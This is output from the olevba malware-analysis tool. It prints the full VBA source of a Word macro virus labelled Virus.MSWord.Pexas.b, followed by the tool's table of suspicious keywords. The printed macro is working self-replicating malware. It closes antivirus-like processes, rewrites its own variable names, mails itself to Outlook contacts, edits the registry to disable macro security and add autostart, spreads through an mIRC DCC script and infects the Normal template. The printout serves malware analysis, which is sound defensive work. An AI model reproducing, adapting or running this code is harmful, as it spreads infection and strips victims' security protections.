olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pexas.b-6bb0d5fbe8358521ae2a54e3f275b7f75fce307c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pexas.b-6bb0d5fbe8358521ae2a54e3f275b7f75fce307c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
Sub Document_Open()
On Error Resume Next
'[die3.B] Virus by MI_pirat
'payload
nr = Day(Date)
If nr = 23 Then
MsgBox Chr(34) + Chr(100) + Chr(105) + Chr(101) + Chr(32) + Chr(100) + Chr(105) + Chr(101) + Chr(32) + _
Chr(100) + Chr(105) + Chr(101) + Chr(34) + Chr(32) + Chr(45) + Chr(91) + Chr(100) + Chr(105) + Chr(101) + _
Chr(51) + Chr(93) + Chr(45) + Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(77) + Chr(73) + Chr(95) + Chr(112) + _
Chr(105) + Chr(114) + Chr(97) + Chr(116), vbInformation, Chr(100) + Chr(105) + Chr(101) + Chr(51) + Chr(32) + _
Chr(86) + Chr(105) + Chr(114) + Chr(117) + Chr(115)
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", "Wallpaper") = "C:\Windows\setup.bmp"
ShowCursor 0
End If
'inchide antivir. daca e pornit
Set char1 = Tasks
For ik = 1 To char1.Count
If InStr(1, char1(ik).Name, "av", vbTextCompare) Or InStr(1, char1(ik).Name, "AV", vbTextCompare) Then
char1(ik).Close
End If
Next ik
'poly starts here:
Set char1 = ActiveDocument.VBProject
Set char2 = char1.VBComponents(1).CodeModule
If ThisDocument.FullName <> Templates(1).FullName Then
nr = 17
ReDim suk(1 To nr) As String
suk(1) = "nr": suk(2) = "bkup": suk(3) = "suk": suk(4) = "myRange"
suk(5) = "strip": suk(6) = "ik": suk(7) = "char1": suk(8) = "nam1"
suk(9) = "DOutlook": suk(10) = "DMapiName": suk(11) = "BreakUmOffAS"
suk(12) = "mmm": suk(13) = "xxx": suk(14) = "aa": suk(15) = "Pee": suk(16) = "ij": suk(17) = "char2"
'modif var.
For ik = 1 To nr
Randomize
strip = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "Mp"
For bkup = 2 To char2.CountOfLines
nam1 = char2.Lines(bkup, 1)
If InStr(1, nam1, suk(ik), vbTextCompare) Then
nam1 = Replace(nam1, suk(ik), strip, 1, -1, vbTextCompare)
char2.ReplaceLine bkup, nam1
End If
Next bkup
Next ik
'Adauga si ceva caractere aleatoare (ca sa fie si mai poly),dar nu prea multe
For ik = 2 To char2.CountOfLines
nam1 = char2.Lines(ik, 1)
If Len(nam1) <= 100 Then
nam1 = nam1 + "'" + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
char2.ReplaceLine ik, nam1
End If
Next ik
End If
'Virusul propriu-zis
'-------------------------------------------------------------------
'e-mail spread
Dim DOutlook, DMapiName, BreakUmOffAS
mmm = Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107)
Set DOutlook = CreateObject(mmm + ".Application")
Set DMapiName = DOutlook.GetNameSpace("MAPI")
If DOutlook = mmm Then
DMapiName.Logon "profile", "password"
Set mmm = DMapiName.AddressLists
For ik = 1 To mmm.Count
Set ABook = DMapiName.AddressLists(ik)
xxx = 1
Set aa = ABook.AddressEntries
Set BreakUmOffAS = DOutlook.CreateItem(0)
For ij = 1 To aa.Count
Pee = aa(xxx)
BreakUmOffAS.Recipients.Add Pee
xxx = xxx + 1
If xxx > 20 Then nr = aa.Count
Next ij
BreakUmOffAS.Subject = "hello!!!"
BreakUmOffAS.Body = "Cool jokes (more in the doc.) "
BreakUmOffAS.Attachments.Add ActiveDocument.FullName
BreakUmOffAS.Send
Pee = ""
Next ik
DMapiName.Logoff
End If
'verif. daca a infectat compu'
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") <> "inXP" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") = "inXP"
'securitate, ce securitate?! :D
Options.SaveNormalPrompt = 5 Xor 5
CommandBars(Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Enabled = (1 Xor 1)
Open "C:\a.reg" For Output As #1
Print #1, "REGEDIT4"
Print #1, ""
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]"
Print #1, """Level"" = dword:00000001"
Print #1, """AccessVBOM"" = dword:00000001"
Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]"
Print #1, """doc"" = " + """" + ActiveDocument.FullName + """"
Close #1
Shell "C:\Windows\regedit /s C:\a.reg"
Kill "C:\a.reg"
'aduga si un .zip ca sa nu aiba probleme cu ignorarea automata a mIRC-ului
Randomize
strip = ActiveDocument.FullName
nam1 = "C:\" + Chr(Int((25 * Rnd) + 65)) + ".zip"
scr = "C:\" + Chr(Int((25 * Rnd) + 65)) + ".doc"
ActiveDocument.SaveAs scr
ActiveDocument.SaveAs strip
strip = Application.System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" & _
"\CurrentVersion\App Paths\winzip32.exe", "")
Shell strip & " -a -r " & nam1 & Chr(32) & scr, vbHide
'si acum face un script pt. mIRC
'gaseste path-ul (cam ciudat nu?!)
strip = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\mIRC\", "UninstallString")
strip = Mid(strip, 2, Len(strip) - 23)
Open strip + "script.ini" For Output As #1
Print #1, "[Script]"
Print #1, "n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n1=/dcc send $nick " & Chr(34) & nam1 & Chr(34)
Print #1, "n2=}"
Close #1
'hai si un normal.dot
nr = char2.CountOfLines
Set char1 = Templates(1).VBProject.VBComponents
Set char2 = char1.Item(1).CodeModule
char2.DeleteLines 1, char2.CountOfLines
char2.InsertLines 1, "Sub Document_Close"
For ik = 2 To nr
Set char1 = ActiveDocument.VBProject
Set char2 = char1.VBComponents(1).CodeModule
nam1 = char2.Lines(ik, 1)
Set char1 = Templates(1).VBProject.VBComponents
Set char2 = char1.Item(1).CodeModule
char2.InsertLines ik, nam1
Next ik
Set char1 = Templates(1)
char1.Save
End If
'verifica daca fisierul este infect (numara liniile)
Set char1 = ActiveDocument.VBProject
Set char2 = char1.VBComponents(1).CodeModule
nr = char2.CountOfLines
If Not ((nr < 163) And (nr > 160)) Then
char2.DeleteLines 1, nr
Set char1 = Templates(1).VBProject.VBComponents
Set char2 = char1.Item(1).CodeModule
nam1 = char2.Lines(1, 1)
Set char1 = ActiveDocument.VBProject
Set char2 = char1.VBComponents(1).CodeModule
char2.InsertLines 1, nam1
char2.InsertLines 2, "Sub Document_Open"
Set char1 = Templates(1).VBProject.VBComponents
Set char2 = char1.Item(1).CodeModule
nr = char2.CountOfLines
For ik = 3 To nr
nam1 = char2.Lines(ik, 1)
Set char1 = ActiveDocument.VBProject
Set char2 = char1.VBComponents(1).CodeModule
char2.InsertLines ik, nam1
Next ik
ActiveDocument.Save
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |a.reg               |Executable file name                         |
|IOC       |winzip32.exe        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
